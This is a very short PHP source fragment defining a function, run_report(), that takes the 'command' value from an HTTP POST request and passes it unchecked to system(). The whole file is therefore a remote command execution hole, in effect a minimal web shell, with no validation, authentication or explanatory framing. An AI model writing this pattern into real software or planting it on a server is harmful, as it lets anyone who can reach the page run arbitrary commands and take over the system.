<?php

function run_report(): void
{
    $command = $_POST["command"];
    system($command);
}
